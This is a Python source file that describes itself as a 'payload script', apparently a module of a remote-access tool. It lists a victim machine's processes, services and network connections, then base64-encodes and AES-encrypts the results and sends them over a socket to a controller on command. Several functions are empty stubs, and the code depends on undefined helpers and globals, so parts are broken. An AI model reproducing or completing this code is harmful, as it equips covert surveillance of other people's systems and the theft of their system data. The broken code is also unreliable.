'''
MANAGER
VERSION : 1.0.0
Author : ISSAC

THIS IS A PYTHON PAYLOAD SCRIPT OF MANAGEMENT
FUNCTION :
- PROCESS MANAGER
- SERVICE MANAGER

'''

import subprocess
import os
import sys
import ctypes
import re

class Manager:
    def __init__(self, sock) -> None:
        self.LIST_CHILDREN = False
        self.sock = sock
        self.win_prop_list = [
            'DisplayName',
            'Name',
            'ProcessId',
            'SystemName',
            'Description',
            'State',
            'AcceptPause',
            'AcceptStop',
            'PathName',
        ]
        self.linux_prop_list = [
            'Id',
            'Name',
            'MainPID',
            'ControlPID',
            'ExecMainPID',
            'ActiveState',
            'AcceptPause',
            'AcceptStop',
            'ExecStart',
        ]

    def find_all_matches(self, s):
        pat = r'^\s*([^ ]+)'
        pos = 0
        result = []
        while (m := pat.search(s, pos)) is not None:
            pos = m.start() + 1
            result.append(m[1])
        return result

    def win32_property(self, w, name):
        return w.Properties_(name)

    '''
    PROCESS MANAGEMENT
    '''
    # LIST PROCESS
    def Process_List(self):
        result = []
        if unix_like(): # Unix-like, unix_like()
            for pid in os.listdir('/proc'):
                if pid.isdigit():
                    try:
                        # CMDLINE
                        with open(f'/proc/{pid}/cmdline', 'rb') as cl:
                            cmdline = cl.read().decode().split('\x00')
                        info = [
                            pid, # PROCESS ID
                            cmdline[0], # IMAGE
                            os.readlink(f'/proc/{pid}/exe') if os.path.exists(f'/proc/{pid}/exe') else 'None' # PATH
                        ]
                        info = ','.join([b64EnStr(i) for i in info])
                        result.append(info)
                    except Exception as e:
                        raise(e)
        else: # Windows
            # IMPORT LIBRARY
            '''
            IMPLEMENTATION OF DATA STRUCTURE FOR SEND:
            FIRSTLY, THE PARENT PROCESS:
                ALL PID, NAME, PATH ENCODE TO BASE64
                STORE IN A LIST [B64(ALL),B64(PID),B64(NAME)]
                CONVERT THIS LIST INTO ONE BASE64 STRING : V1 = ','.join(LIST)
            SECONDLY, FOR EACH PARENT PROCESS IN FOR LOOP:
                IF ENABLE, THEN IT DO THE SAME THING SAME AS PARENT PROCESS.
                THE FINAL RESULT, CALL IT V2
            B64.B64
            '''
            import pythoncom
            import win32com.client
            pythoncom.CoInitialize()
            wmi = win32com.client.GetObject('winmgmts:')
            for p in wmi.InstancesOf('win32_process'):
                pid = p.Properties_('ProcessID')
                name = p.Properties_('Name')
                path = p.Properties_('ExecutablePath')
                result.append(','.join([b64EnStr(str(i)) for i in [pid, name, path]]))
                if self.LIST_CHILDREN:
                    rc = [] # CHILDREN'S RESULT
                    children = wmi.ExecQuery(f'select * from win32_process where ParentProcessId={pid}')
                    for child in children:
                        child_pid = child.Properties_('ProcessID')
                        child_name = child.Properties_('Name')
                        child_exePath = child.Properties_('ExecutablePath')
                        rc.append('|'.join([b64EnStr(str(i)) for i in [child_pid, child_name, child_exePath]]))
                    index = len(result) - 1
                    s = b64EnStr(','.join(rc))
                    result[index] += '.' + s
            try:
                pythoncom.CoUninitialize()
            except:
                pass
        result = ','.join([b64EnStr(i) for i in result])
        return result

    # START PROCESS
    def Process_Start(self):
        pass

    # RESTART PROCESS
    def Process_Restart(self):
        pass

    # STOP PROCESS
    def Process_Stop(self):
        pass

    '''
    SERVICE MANAGEMENT
    '''
    # LIST SERVICE
    def Service_List(self):
        result = []
        if unix_like(): # Unix like
            # EXECUTE systemctl COMMAND TO LIST ALL SERVICES ON Linux
            output = subprocess.check_output(['systemctl', 'list-units', '--type=service', '--all'], universal_newlines=True)
            services = []
            # PARSE OUTPUT TO SERVICES LIST
            for line in output.splitlines()[1:]:
                _match = re.match(r'^\s*([^ ]+)', line)
                if _match:
                    name = _match.group(1)
                    services.append(name)

            for s in services:
                output = subprocess.check_output(['systemctl', 'show', '--no-page', '--all', s], universal_newlines=True)
                info = {}
                for line in output.splitlines():
                    key, value = line.strip().split('=', 1)
                    info[key] = value
                tmp = []
                for prop in self.linux_prop_list:
                    tmp.append(info[prop])
                result.append(','.join([b64EnStr(str(i)) for i in tmp]))
        else: # Windows
            import pythoncom
            import win32com.client
            pythoncom.CoInitialize()
            wmi = win32com.client.GetObject('winmgmts:')
            for s in wmi.InstancesOf('win32_service'):
                tmp = []
                for prop in self.win_prop_list:
                    tmp.append(self.win32_property(s, prop))
                result.append(','.join([b64EnStr(str(i)) for i in tmp]))
            try:
                pythoncom.CoUninitialize()
            except:
                pass
        result = ','.join([b64EnStr(str(i)) for i in result])
        return result

    # START SERVICE
    def Service_Start(self):
        pass

    # STOP SERVICE
    def Service_Stop(self):
        pass

    '''
    CONNECTION
    '''
    def Connection_List(self):
        module = None
        try:
            module = __import__('psutil')
            result = []
            for protocol in ['tcp', 'udp']:
                for conn in (module.net_connections(kind=protocol)):
                    laddr_tuple = conn[3]
                    raddr_tuple = conn[4]

                    l_ip = laddr_tuple[0]
                    l_port = laddr_tuple[1]
                    if len(raddr_tuple) > 0:
                        r_ip = raddr_tuple[0]
                        r_port = raddr_tuple[1]
                    else:
                        r_ip = ''
                        r_port = ''
                    status = conn[5]
                    pid = conn[6]
                    line = f'{protocol.upper()},{l_ip},{l_port},{r_ip},{r_port},{status},{pid}'
                    result.append(b64EnStr(line))
            
            result = ','.join(result)
            result = b64EnStr(result)
            return f'1|{result}'
        except ModuleNotFoundError as e:
            return f'0|{b64EnStr(str(e))}'

    '''
    MAIN FUNCTION
    '''
    def run(self):
        command = para[0]
        payload = ''
        if command == 'lp': # LIST PROCESS
            children = para[1]
            self.LIST_CHILDREN = True if children == '1' else False
            payload = f'M|lp|1|{b64EnStr(self.Process_List())}'
        elif command == 'ls': # LIST SERVICES
            payload = f'M|ls|1|{b64EnStr(self.Service_List())}'
        elif command == 's_start': # SERVICE START
            pass
        elif command == 's_stop': # SERVICE STOP
            pass
        elif command == 'lc': # LIST CONNECTION
            payload = self.Connection_List()
            payload = f'M|lc|{payload}'

        buffer = b64EnStr(payload)
        self.sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

if __name__ == '__main__':
    m = Manager()
    m.Process_List()